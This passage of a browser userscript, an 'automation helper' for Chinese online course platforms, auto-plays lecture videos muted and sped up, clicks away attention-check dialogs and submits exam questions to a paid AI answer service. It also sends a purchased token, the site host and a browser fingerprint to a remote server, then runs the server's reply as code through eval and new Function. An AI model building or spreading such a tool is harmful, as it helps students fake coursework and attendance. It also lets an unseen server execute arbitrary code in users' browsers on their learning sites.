                activeClass: "cur",
                nextClass: ".littletit",
                openListenPlayTime: !1,
                getCurrentIndexByOption: a => new Promise(t => {
                    for (let e = 0; e < a.ElementObj.$allTask.length; e++) {
                        var o = a.ElementObj.$allTask[e].querySelector(".littlebot").querySelector(".el-progress"),
                            n = a.ElementObj.$allTask[e].querySelector(".elli").innerText.trim();
                        if (o && -1 == n.indexOf("\u5728\u7ebf\u4f5c\u4e1a") && -1 == n.indexOf("\u4e60\u9898\u6d4b\u9a8c") && -1 == n.indexOf("Test")) {
                            t(e);
                            break
                        }
                    }
                }),
                listenRebortFn: e => {
                    var t = document.querySelector("._active.elli"),
                        o = (t?.parentElement?.parentElement).querySelector(".el-icon-circle-check"),
                        t = t.innerText.trim();
                    !o && "\u5728\u7ebf\u4f5c\u4e1a" != t && -1 == t.indexOf("\u4e60\u9898\u6d4b\u9a8c") && -1 == t.indexOf("Test") || e.playNext()
                }
            }
        },
        aa101: {mainClass: "CTXCommon", option: {nodeListClass: ".level2>a", activeClass: "cur"}},
        sfgd: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".chapterList>li",
                activeClass: "active",
                topicListClass: [".questionList"],
                listenRebortFn(e) {
                    document.querySelector(".pauseBg")?.click()
                }
            }
        },
        ojisa: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", nextClass: "span", async _init(o) {
                    let e = setInterval(async () => {
                        if (o.ElementObj.$allTask = document.querySelectorAll(".courseMenuList>li"), o.ElementObj.$allTask.length) {
                            clearInterval(e);
                            for (let e = 0; e < o.ElementObj.$allTask.length; e++) {
                                var t = o.ElementObj.$allTask[e];
                                if ("100%" !== t.querySelector(".f-right").innerText.trim()) {
                                    o.currentIndex = e, t.classList.contains("active") || (t.querySelector("span")?.click(), await MyTool.sleep(1e3)), o._o1(o), o.vueInstance.handleAddInfo("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u8bf7\u624b\u52a8\u70b9\u51fb\u4e00\u6b21\u64ad\u653e\u6309\u94ae"), o.vueInstance.handleAddInfo("🔊\u53ea\u9700\u70b9\u51fb\u4e00\u6b21，\u540e\u9762\u89c6\u9891\u4f1a\u81ea\u52a8\u64ad\u653e");
                                    break
                                }
                            }
                        }
                    }, 500)
                }, listenRebortFn(e) {
                    document.querySelector(".el-message-box__wrapper .el-button--danger")?.click()
                }
            }
        }
    };

    class CTXCommon {
        constructor() {
            this.nodeListClass = "", this.activeClass = "", this.nextClass = "", this.openListenPlayStatus = !0, this.openListenPlayTime = !1, this.spd = 1, this.taskLength = 0, this.ElementObj = {}, this.currentIndex = -1, this.listenVidoeStatusTimer = null, this.fingerprint = "", this.vueInstance = null, this.newToken = MyTool.getValue("newToken") || localStorage.getItem("newToken") || "", this.apis = null
        }

        async props() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            this.playFn ? await this.playFn(this) : (1 == e && (this.beforePlayVideo && "function" == typeof this.beforePlayVideo && this.beforePlayVideo(), this.ElementObj.$video.volume = 0, this.ElementObj.$video.play(), setTimeout(() => {
                this.ElementObj.$video.playbackRate = this.spd
            }, 3e3), this.openListenPlayStatus && this.listenVidoeStatus(this.ElementObj.$video, () => {
                this.ElementObj.$video.volume = 0, this.ElementObj.$video.play()
            }), this.openListenPlayTime && (await this.changeHtml(this.ElementObj.$video.parentElement), this.listenPlayTime()), this.listenRebort(), this.ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext(this)
            }), this.ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    this.ElementObj.$video.volume = 0, this.ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await MyTool.sleep(3e3), this.playNext(this)))
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    "string" == typeof this.nodeListClass ? this.ElementObj.$allTask = document.querySelectorAll(this.nodeListClass) : this.ElementObj.$allTask = this.nodeListClass(), this.ElementObj.$allTask.length && (clearInterval(e), this.vueInstance.handleAddInfo("✅\u5df2\u627e\u5230\u4efb\u52a1\u5217\u8868，\u5373\u5c06\u5f00\u59cb\u81ea\u52a8\u5b66\u4e60"), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            if (this.getCurrentIndexByOption) this.currentIndex = await this.getCurrentIndexByOption(this); else for (var e = 0; e <= this.ElementObj.$allTask.length - 1; e++) if (this.ElementObj.$allTask[e].classList.contains(this.activeClass)) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 2e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, o = setInterval(() => {
                    t += 1, this.ElementObj.$video = document.querySelectorAll("video")[0], this.ElementObj.$video && (this.ElementObj.$video.src || this.ElementObj.$video.querySelector("source")) ? (clearInterval(o), e(1)) : 6 <= t && (clearInterval(o), e(2))
                }, 1e3)
            })
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                this.listenRebortFn && "function" == typeof this.listenRebortFn && this.listenRebortFn(this)
            }, 1e4)
        }

        async playNext() {
            if (this.beforePlayNext && "function" == typeof this.beforePlayNext && this.beforePlayNext(this), this.currentIndex >= this.ElementObj.$allTask.length - 1) alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c"); else {
                await MyTool.sleep(2500), this.currentIndex += 1;
                let e = this.ElementObj.$allTask[this.currentIndex];
                (e = this.nextClass ? this.ElementObj.$allTask[this.currentIndex].querySelector(this.nextClass) : e)?.click(), this.afterPlayEnd && await this.afterPlayEnd(), setTimeout(() => {
                    this._o1()
                }, 5e3)
            }
        }

        listenPlayTime() {
            let o = 0;
            this.timer = setInterval(async () => {
                o += 1;
                var e = (this.ElementObj.$video?.currentTime / 60).toFixed(2), t = this.ElementObj.$video?.duration;
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${o}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`)
            }, 5e3)
        }

        listenVidoeStatus(t, o) {
            if (t) {
                let e = 0;
                this.listenVidoeStatusTimer = setInterval(() => {
                    t.readyState < 4 && 20 <= (e += 1) && location.reload(), t.paused && (e += 1, "function" == typeof o) && (20 <= e ? location.reload() : o())
                }, 5e3)
            }
        }

        async changeHtml(e, t = document) {
            var o;
            this.ElementObj.$roapannel_page = t.querySelector(".roapannel_page"), this.ElementObj.$roapannel_page || ((o = document.createElement("div")).setAttribute("class", "roapannel_page"), o.setAttribute("style", `
          width: 100%;
          height: 100%;
          background: #000;
          position: absolute;
          z-index: 999;
          overflow: scroll;
          top: 0;
          padding-left: .625rem;
          z-index: 9999;
      `), e.appendChild(o), await MyTool.sleep(300), this.ElementObj.$roapannel_page = t.querySelector(".roapannel_page")), this.addInfo("\u9762\u677f\u521d\u59cb\u5316\u5b8c\u6210")
        }

        addInfo(e, t, o) {
            o = o || globalThis.document;
            45 <= document.querySelectorAll(".roapannel_page_li").length && (this.ElementObj.$roapannel_page.innerHTML = "");
            o = `<li class="roapannel_page_li" style="color: ${0 == t ? "#f01414" : "#fff"};line-height: 1.875rem;font-size: 1rem;list-style: none;">#roa~ ${e}</li>`;
            this.ElementObj.$roapannel_page.innerHTML += o
        }

        async _o1() {
            if (!this.newToken) return alert("\u8bf7\u5148\u8d2d\u4e70key");
            if ("1" !== CTXCommon.token_t) this.vueInstance.handleAddInfo("🚯🚯🚯\u5f53\u524dtoken\u4ec5\u9650\u4e8eAi\u7b54\u9898🚯🚯🚯"), this.vueInstance.handleAddInfo("🚯🚯🚯\u5f53\u524dtoken\u4ec5\u9650\u4e8eAi\u7b54\u9898🚯🚯🚯"); else {
                let res = await MyTool.axfedata({
                    method: "GET",
                    url: `${bl}/open/basic_order/info/init/sp?toolkey=${this.newToken}&t=2&h=${location.host}&fingerprint=${this.fingerprint}&v=` + version,
                    headers: {"Content-Type": "application/json"}
                });
                try {
                    this.vueInstance.handleAddInfo(res.message);
                    let dynamicFunction = eval("(" + `async () => {
                        await ${this.jjm(res.data)};
                    }` + ")");
                    await dynamicFunction.call(this)
                } catch (e) {
                    alert(res.message)
                }
            }
        }

        jjm(e) {
            return new Function("hex", jjmlo)(e)
        }

        getCookieValue(t) {
            var o = document.cookie.split(";");
            for (let e = 0; e < o.length; e++) {
                var [n, a] = o[e].trim().split("=");
                if (n === t) return decodeURIComponent(a)
            }
            return null
        }
    }

    CTXCommon.token_t = "2";

    class Main extends CTXCommon {
        constructor(e, t) {
            super(), this.vueInstance = t, this.nodeListClass = e.nodeListClass, this.activeClass = e.activeClass || "", this.nextClass = e.nextClass || "", this.spd = e.spd || 1, this.openListenPlayStatus = "boolean" != typeof e.openListenPlayStatus || e.openListenPlayStatus, this.openListenPlayTime = "boolean" == typeof e.openListenPlayTime && e.openListenPlayTime, this.apis = e.apis || {}, this.afterPlayEnd = e.afterPlayEnd, this.getCurrentIndexByOption = e.getCurrentIndexByOption?.bind(this, this), this.playNext = e.playNext || this.playNext, this.listenRebortFn = e.listenRebortFn, this.getVideoDom = "function" == typeof e.videoEle ? e.videoEle.bind(this, this) : this.getVideoDom, this.playFn = e.playFn, this.beforePlayVideo = e.beforePlayVideo, this.beforePlayNext = e.beforePlayNext, this.getCurrentIndex = e.getCurrentIndex ? e.getCurrentIndex.bind(this, this) : this.getCurrentIndex, e._init ? e._init(this) : this._init()
        }
    }

    let st = null;

    function bootstrap() {
        if (unsafeWindow.Vue = Vue, unsafeWindow.Vue) {
            let app = Vue.createApp({
                data() {
                    return {
                        isCollapsed: !1,
                        position: {x: 20, y: 20},
                        isDragging: !1,
                        dragOffset: {x: 0, y: 0},
                        logs: ["System initialized", "✅✅✅\u521d\u59cb\u5316\u5b8c\u6210", "\u5f53\u524d\u9875\u9762：" + document.title],
                        currentCommand: "",
                        playbackSpeed: 1,
                        tokenInfo: "",
                        isTokenBound: !1,
                        appObj: {},
                        toolOption: [1, 2, 3, 5, 10, 16],
                        isOpenSeting: !1,
                        searchMode: "Deepseek",
                        openAutoSubmit: !0,
                        showLoading: !1,
                        _st: null
                    }
                }, computed: {
                    formattedDate() {
                        return (new Date).toLocaleDateString("en-US", {year: "numeric", month: "short", day: "numeric"})
                    }
                }, watch: {
                    logs: {
                        handler() {
                            this.scrollToBottom()
                        }, deep: !0
                    }
                }, methods: {
                    hanldeSearch() {
                        var e = {...this._st};
                        if (!this.tokenInfo || "\u672a\u7ed1\u5b9a" === this.tokenInfo) return window.open("https://roa.gaozhiwang.top/"), alert("\u8bf7\u5148\u7ed1\u5b9atoken");
                        this.showLoading = !0;
                        let t = e.topicListClass;
                        if (!(t = "function" == typeof t ? t() : t)) return this.showLoading = !1, alert("#1 \u672a\u627e\u5230\u9898\u76ee");
                        let o = null;
                        if (Array.isArray(t)) for (var n of t) {
                            n = document.querySelector(n);
                            if (n) {
                                o = n.innerText.replace(/\n/g, "");
                                break
                            }
                        } else o = t.innerText.replace(/\n/g, "");
                        if (!o) return alert("#2 \u672a\u627e\u5230\u9898\u76ee");
                        MyTool.axfedata({
                            method: "POST",
                            url: bl + "/open/basic_topic/info/topic/searchByAi",
                            headers: {Connection: "keep-alive", "Content-Type": "application/json"},
                            data: JSON.stringify({
                                prompt: o,
                                token: this.tokenInfo,
                                type: this.searchMode,
                                _st: location.host,
                                version: version
                            })
                        }).then(async e => {
                            this.showLoading = !1, this.logs.push("✅✅✅" + e)
                        })
                    }, saveUsercConfig() {
                        MyTool.setValue("userSet", {
                            searchMode: this.searchMode,
                            openAutoSubmit: this.openAutoSubmit
                        }), alert("\u4fdd\u5b58\u6210\u529f")
                    }, pdChange() {
                        this.logs.push(`\u64ad\u653e\u901f\u5ea6\u66f4\u6362\u5230 ${this.playbackSpeed}x`), MyTool.setValue("newSpeed", Number(this.playbackSpeed)), location.reload()
                    }, handleAddInfo(e, t) {
                        100 < this.logs.length && this.logs.splice(0, 60), this.logs.push(e)
                    }, scrollToBottom() {
                        this.$nextTick(() => {
                            this.$refs.terminalContentRef && (this.$refs.terminalContentRef.scrollTop = this.$refs.terminalContentRef.scrollHeight)
                        })
                    }, navigateToVideo() {
                        window.location.href = "https://roa.gaozhiwang.top/", this.logs.push("Navigating to video page...")
                    }, toggleCollapse() {
                        this.isCollapsed = !this.isCollapsed, this.logs.push(this.isCollapsed ? "Panel collapsed" : "Panel expanded")
                    }, unbindToken() {
                        if (this.isTokenBound) confirm("\u4f60\u786e\u5b9a\u8981\u89e3\u7ed1\u5f53\u524d\u7684token\u5417?") && (this.isTokenBound = !1, this.tokenInfo = "\u672a\u7ed1\u5b9a", MyTool.setValue("newToken", null), localStorage.removeItem("newToken"), this.logs.push("✅Token unbound successfully")); else {
                            let t = prompt("\u8f93\u5165 token \u53bb\u7ed1\u5b9a:");
                            t && t.trim() && MyTool.axfedata({
                                method: "POST",
                                headers: {"Content-Type": "application/json"},
                                url: bl + "/open/basic_order/info/verificaActiveCode",
                                data: JSON.stringify({toolkey: t})
                            }).then(e => {
                                if (200 !== e.code) return window.location.href = "https://roa.gaozhiwang.top/", alert(e.message);
                                this.isTokenBound = !0;
                                e = t;
                                localStorage.setItem("newToken", t), MyTool.setValue("newToken", t), this.tokenInfo = e, this.logs.push("✅Token \u7ed1\u5b9a successfully")
                            })
                        }
                    }, startDrag(e) {
                        e.target.closest(".minimize-btn") || e.target.closest(".unbind-btn") || e.target.closest(".panel-title") || (this.isDragging = !0, this.dragOffset = {
                            x: e.clientX - this.position.x,
                            y: e.clientY - this.position.y
                        }, document.addEventListener("mousemove", this.onDrag), document.addEventListener("mouseup", this.stopDrag))
                    }, onDrag(e) {
                        this.isDragging && (this.position = {
                            x: e.clientX - this.dragOffset.x,
                            y: e.clientY - this.dragOffset.y
                        })
                    }, stopDrag() {
                        this.isDragging = !1, document.removeEventListener("mousemove", this.onDrag), document.removeEventListener("mouseup", this.stopDrag)
                    }, executeCommand() {
                        var e;
                        this.currentCommand.trim() && (this.logs.push(this.currentCommand), "clear" === this.currentCommand.toLowerCase() ? this.logs = ["Console cleared"] : "help" === this.currentCommand.toLowerCase() ? this.logs.push("Available commands: clear, help, version, date, speed, token, video") : "version" === this.currentCommand.toLowerCase() ? this.logs.push("Current version: 1.2.3") : "date" === this.currentCommand.toLowerCase() ? this.logs.push("Current date: " + this.formattedDate) : "speed" === this.currentCommand.toLowerCase() ? this.logs.push(`Current playback speed: ${this.playbackSpeed}x`) : "token" === this.currentCommand.toLowerCase() ? this.logs.push("Token: " + this.tokenInfo) : "unbind" === this.currentCommand.toLowerCase() ? this.unbindToken() : "video" === this.currentCommand.toLowerCase() ? this.navigateToVideo() : this.currentCommand.toLowerCase().startsWith("speed ") ? (e = this.currentCommand.split(" ")[1], ["0.25", "0.5", "0.75", "1", "1.25", "1.5", "1.75", "2"].includes(e) ? (this.playbackSpeed = e, this.logs.push(`Playback speed set to ${e}x`)) : this.logs.push("Invalid speed value. Use 0.25, 0.5, 0.75, 1, 1.25, 1.5, 1.75, or 2")) : this.logs.push("Unknown command: " + this.currentCommand), this.currentCommand = "")
                    }, checkBoundaries() {
                        var e, t, o = this.$refs.panelRef;
                        o && (o = o.getBoundingClientRect(), e = window.innerWidth, t = window.innerHeight, o.right > e && (this.position.x = e - o.width), t < o.bottom && (this.position.y = t - o.height), this.position.x < 0 && (this.position.x = 0), this.position.y < 0) && (this.position.y = 0)
                    }
                }, async mounted() {
                    let userSet = MyTool.getValue("userSet"),
                        current_host = (userSet && (this.searchMode = userSet.searchMode, this.openAutoSubmit = userSet.openAutoSubmit), this.playbackSpeed = MyTool.getValue("newSpeed") || 1, this.tokenInfo = MyTool.getValue("newToken") || localStorage.getItem("newToken") || "\u672a\u7ed1\u5b9a", this.isTokenBound = !!this.tokenInfo && "\u672a\u7ed1\u5b9a" !== this.tokenInfo, this.scrollToBottom(), window.addEventListener("resize", this.checkBoundaries), this.checkBoundaries(), location.host);
                    if (!/www.gaozhiwang.top/.test(current_host) && this.isTokenBound) {
                        let result = await MyTool.axfedata({
                            method: "GET",
                            url: bl + (`/open/basic_order/info/init/sp?toolkey=${this.tokenInfo}&t=1&h=${location.host}&fingerprint=${localStorage.getItem("fingerprint")}&v=` + version)
                        });
                        if (200 == result.code) if (CTXCommon.token_t = result.order_type, result.options) {
                            let options = null;
                            eval(result.options), this._st = {...options}, this.appObj = new Main({
                                ...options,
                                spd: this.playbackSpeed
                            }, this)
                        } else {
                            let opiton = new Function("hex", jjmlo)(result.id),
                                _a = "CTXCommon" == os[opiton].mainClass ? os[opiton].option : eval(os[opiton].mainClass);
                            this._st = _a, this.appObj = "CTXCommon" == os[opiton].mainClass ? new Main({
                                ..._a,
                                spd: this.playbackSpeed
                            }, this) : new _a
                        } else if (-404 != result.code) try {
                            eval(new Function("hex", jjmlo)(result.data))
                        } catch (e) {
                            this.logs.push(result.message)
                        }
                    }
                }, unmounted() {
                    document.removeEventListener("mousemove", this.onDrag), document.removeEventListener("mouseup", this.stopDrag), window.removeEventListener("resize", this.checkBoundaries)
                }
            });
            app.mount(document.querySelector("#vue-app"))
        } else console.error("Vue 3 \u52a0\u8f7d\u5931\u8d25")
    }

    function getCss() {
        return `    
.function-panel {
  position: fixed;
  width: 320px;
  background: rgba(30, 30, 40, 0.85);
  backdrop-filter: blur(8px);
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  color: #fff;
  font-family: 'Inter', sans-serif;
  overflow: hidden;
  transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
  border: 1px solid rgba(255, 255, 255, 0.1);
  z-index: 9999;
}

.function-panel.collapsed {
  width: 60px;
  height: 60px !important;
  border-radius: 50%;
  background: linear-gradient(135deg, #6366f1, #8b5cf6);
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.expand-button {
  width: 100%;
  height: 100%;
  background: transparent;
  border: none;
  color: white;
  font-size: 24px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
}

.panel-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 16px;
  background: linear-gradient(90deg, #6366f1, #8b5cf6);
  cursor: move;
  user-select: none;
}

.panel-title {
  font-weight: 600;
  font-size: 14px;
  letter-spacing: .5008px;
  cursor: pointer;
  position: relative;
  transition: all 0.2s;
  padding-bottom: 2px;
}

.panel-title:hover {
  color: rgba(255, 255, 255, 0.9);
}

.panel-title::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 0;
  height: 1px;
  background-color: white;
  transition: width 0.2s;
}

.panel-title:hover::after {
  width: 100%;
}

.minimize-btn {
  background: none;
  border: none;
  color: white;
  font-size: 18px;
  cursor: pointer;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 4px;
  transition: background 0.2s;
}

.minimize-btn:hover {
  background: rgba(255, 255, 255, 0.2);
}

.panel-content {
  padding: 9px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.video-controls {
  display: flex;
  gap: 8px;
  justify-content: center;
  background: rgba(0, 0, 0, 0.2);
  padding: 6px;
  border-radius: 8px;
}

.control-btn {
  background: rgba(255, 255, 255, 0.1);
  border: none;
  color: white;
  width: 29px;
  height: 29px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.2s;
}
.control-btn>.icon{
  font-size: 12px;
}

.control-btn:hover {
  background: rgba(255, 255, 255, 0.2);
  transform: translateY(-2px);
}

.control-btn:active {
  transform: translateY(0);
}

.speed-selector {
  position: relative;
  height: 29px;
  min-width: 80px;
}

.speed-select {
  appearance: none;
  background: rgba(255, 255, 255, 0.1);
  border: none;
  border-radius: 8px;
  color: white;
  cursor: pointer;
  font-size: 12px;
  height: 100%;
  padding: 0 12px;
  width: 100%;
  transition: all 0.2s;
}

/* Style for dropdown options */
.speed-select option {
  background-color: white;
  color: black;
  font-size: 14px;
  padding: 8px;
}

.speed-select:hover {
  background: rgba(255, 255, 255, 0.2);
  transform: translateY(-2px);
}

.speed-select:active {
  transform: translateY(0);
}

.speed-select:focus {
  outline: none;
  box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
}

/* Custom dropdown arrow */
.speed-selector::after, .special::after{
  content: "▼";
  font-size: 10px;
  color: white;
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  pointer-events: none;
}

/* Token section */
.token-section {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: rgba(0, 0, 0, 0.2);
  padding: 6px 12px;
  border-radius: 8px;
  font-size: 12px;
}

.token-info {
  display: flex;
  align-items: center;
  gap: 8px;
}

.token-label {
  font-size: 12px;
  font-weight: 600;
  color: rgba(255, 255, 255, 0.8);
}

.token-value {
  font-size: 12px;
  font-family: 'Fira Code', monospace;
  color: #a5b4fc;
}

.unbind-btn {
  background: rgba(239, 68, 68, 0.2);
  color: rgba(239, 68, 68, 0.9);
  border: 1px solid rgba(239, 68, 68, 0.3);
  border-radius: 4px;
  padding: 1px 6px;
  font-size: 12px;
  cursor: pointer;
  transition: all 0.2s;
}

.unbind-btn:hover {
  background: rgba(239, 68, 68, 0.3);
  transform: translateY(-1px);
}

.unbind-btn:active {
  transform: translateY(0);
}

.info-section {
  display: flex;
  justify-content: space-between;
  font-size: 12px;
  color: rgba(255, 255, 255, 0.7);
  padding: 8px 0;
  border-top: 1px solid rgba(255, 255, 255, 0.1);
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
}

.terminal {
  background: rgba(0, 0, 0, 0.3);
  border-radius: 8px;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  height: 170px;
}

.terminal-header {
  background: rgba(0, 0, 0, 0.2);
  padding: 6px 10px;
  font-size: 12px;
  font-weight: 600;
  color: rgba(255, 255, 255, 0.8);
  
}
.terminal-header  span {
  font-size: 12px;
}

.terminal-content {
  text-align: left;
  flex: 1;
  overflow-y: auto;
  padding: 8px;
  font-family: 'Fira Code', monospace;
  font-size: 12px;
  line-height: 1.5;
  scroll-behavior: smooth;
}

.log-line {
  font-size: 12px;
  margin-bottom: 4px;
  color: rgba(255, 255, 255, 0.8);
}

.log-prefix {
  font-size: 12px;
  color: #6366f1;
  margin-right: 4px;
}

.input-line {
  display: flex;
  align-items: center;
}

.input-line input {
  background: transparent;
  border: none;
  color: white;
  font-family: 'Fira Code', monospace;
  font-size: 12px;
  flex: 1;
  outline: none;
  padding: 0;
  margin-left: 4px;
}

/* Custom scrollbar */
.terminal-content::-webkit-scrollbar {
  width: 6px;
}

.terminal-content::-webkit-scrollbar-track {
  background: rgba(0, 0, 0, 0.1);
}

.terminal-content::-webkit-scrollbar-thumb {
  background: rgba(255, 255, 255, 0.2);
  border-radius: 3px;
}

.terminal-content::-webkit-scrollbar-thumb:hover {
  background: rgba(255, 255, 255, 0.3);
}

/* Animation for collapsed state */
@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.05); }
  100% { transform: scale(1); }
}

.function-panel.collapsed:hover {
  animation: pulse 1.5s infinite;
  box-shadow: 0 0 15px rgba(99, 102, 241, 0.6);
}

/* Icon styles */
.icon {
  display: flex;
  align-items: center;
  justify-content: center;
  font-style: normal;
}

.setting-section{
  margin-top: 8px;
  box-sizing: border-box;
  padding: 8px;
  border-radius: 8px;
  background: rgba(0, 0, 0, 0.2);
}
.setting-item{
  position: relative;
  display: flex;
  align-items: center;
  height: 29px;
  margin-top: 8px;
}
.setting-item label {
font-size: 12px;
width: 82px;
text-align: left;
}

.setting-item select {
width: 50px;
}

.special::after {
  right: 59px;
}

.saveBtn{
  background: rgba(255, 255, 255, 0.1);
  border: none;
  color: white;
  border-radius: 8px;
  cursor: pointer;
  font-size: 12px;
  padding: 5px 12px;
}
.screen-loading{
    width: 100%;
    height: 100vh;
    position: fixed;
    top: 0;
    left: 0;
    background: rgba(0, 0, 0, .33);
    z-index: 99999999;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
  }
    .screen-loading svg {
      animation: rotate 1s linear infinite;
    }
  @keyframes rotate {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`
    }

    function getHTML() {
        return `
          <div 
    :class="['function-panel', { 'collapsed': isCollapsed }]" 
    :style="{ left: position.x + 'px', top: position.y + 'px' }"
    ref="panelRef"
  >
    <button 
      v-if="isCollapsed" 
      class="expand-button"
      @click.stop="toggleCollapse"
      title="Expand panel"
    >
      <span>+</span>
    </button>
    <div 
      v-if="!isCollapsed"
      class="panel-header" 
      @mousedown="startDrag"
      @dblclick="toggleCollapse"
    >
      <div 
        class="panel-title"
        title="Go to video page"
      >
        <a style="color: #fff;" href="https://roa.gaozhiwang.top" target="_blank">ROA\u81ea\u52a8\u5316\u4e07\u80fd\u52a9\u624b</a>
      </div>
      <div class="panel-controls">
        <button class="minimize-btn" @click.stop="toggleCollapse">
          <span>-</span>
        </button>
      </div>
    </div>

    <div v-if="!isCollapsed" class="panel-content">
      <div class="video-controls">
        <button class="control-btn" title="Play" @click.stop="navigateToVideo">
          <i class="icon">
            ▶
          </i>
        </button>
        <button class="control-btn" title="Volume">
          <i class="icon">
            🔉
          </i>
        </button>
        
        <!-- Playback Speed Dropdown -->
        <div class="speed-selector">
          <select v-model="playbackSpeed" class="speed-select" title="Playback Speed" @change="pdChange">
            <option v-for="(item,index) in toolOption" :value="item">{{item}}x</option>
          </select>
        </div>

        <button class="control-btn" title="\u8bbe\u7f6e" @click="isOpenSeting = !isOpenSeting">
          <i class="icon">
            ❄
          </i>
        </button>

        <button class="control-btn" title="AI\u4f5c\u7b54" @click="hanldeSearch">
          <i class="icon">
            🔍
          </i>
        </button>
      </div>

      <div v-show="!isOpenSeting">
      <!-- Token section -->
      <div class="token-section">
        <div class="token-info">
          <div class="token-label">Token:</div>
          <div class="token-value">{{ tokenInfo }}</div>
        </div>
        <button 
          class="unbind-btn" 
          @click="unbindToken" 
          title="Unbind token"
        >
          {{ tokenInfo != '\u672a\u7ed1\u5b9a'?  '\u89e3\u7ed1' : '\u7ed1\u5b9a' }}
        </button>
      </div>

      <!-- Info section -->
      <div class="info-section">
        <div class="version">Version: 1.2.3</div>
        <div class="update-date">\u6700\u540e\u66f4\u65b0: {{ formattedDate }}</div>
      </div>

      <!-- Command terminal -->
      <div class="terminal">
        <div class="terminal-header">
          <span>Console \u8f93\u51fa</span>
        </div>
        <div class="terminal-content" ref="terminalContentRef">
          <div v-for="(log, index) in logs" :key="index" class="log-line">
            <span class="log-prefix">></span> {{ log }}
          </div>
          <div class="input-line">
            <span class="log-prefix">></span>
            <input 
              type="text" 
              v-model="currentCommand" 
              @keyup.enter="executeCommand" 
              placeholder="Type a command..."
            />
          </div>
        </div>
      </div>
            </div>
      <div v-show="isOpenSeting">
        <div class="setting-section">
          <div class="setting-item special">
            <label>\u8bbe\u7f6e\u641c\u9898\u6a21\u578b:</label>
            <select style="width: 9.5rem;" v-model="searchMode" class="speed-select" title="Playback Speed">
              <option value="Deepseek">Deepseek</option>
              <option value="baidu">Baidu</option>
            </select>
          </div>
          <div class="setting-item">
            <button class="saveBtn" @click="saveUsercConfig">\u4fdd\u5b58\u8bbe\u7f6e</button>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="screen-loading" v-show="showLoading">
    <svg t="1742823513424" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="6995" width="90" height="90"><path d="M512 938.666667A426.666667 426.666667 0 0 1 210.346667 210.346667 423.68 423.68 0 0 1 512 85.333333a42.666667 42.666667 0 0 1 0 85.333334 341.333333 341.333333 0 1 0 241.493333 582.826666 42.666667 42.666667 0 0 1 60.16 60.16A423.68 423.68 0 0 1 512 938.666667zM839.68 716.8a42.666667 42.666667 0 0 1-20.053333-56.746667 42.666667 42.666667 0 0 1 56.746666-20.053333 42.666667 42.666667 0 0 1 19.626667 56.746667 42.666667 42.666667 0 0 1-38.4 24.32 42.666667 42.666667 0 0 1-17.92-4.266667z m49.066667-119.466667a42.666667 42.666667 0 0 1-35.413334-47.36 42.666667 42.666667 0 0 1 46.933334-37.546666 42.666667 42.666667 0 0 1 37.973333 47.36A42.666667 42.666667 0 0 1 896 597.333333h-5.12z m-42.666667-161.28A42.666667 42.666667 0 0 1 876.8 384a42.666667 42.666667 0 0 1 51.2 32A42.666667 42.666667 0 0 1 896 469.333333a36.693333 36.693333 0 0 1-9.386667 0 42.666667 42.666667 0 0 1-41.813333-33.28z m-42.666667-105.813333a42.666667 42.666667 0 0 1 13.653334-58.88 42.666667 42.666667 0 0 1 58.88 13.653333 42.666667 42.666667 0 0 1-13.653334 58.88 42.666667 42.666667 0 0 1-22.613333 6.4 42.666667 42.666667 0 0 1-38.826667-20.053333z m-78.08-85.333333a42.666667 42.666667 0 0 1-6.826666-59.733334 42.666667 42.666667 0 0 1 59.733333-6.826666 42.666667 42.666667 0 0 1 6.826667 60.16 42.666667 42.666667 0 0 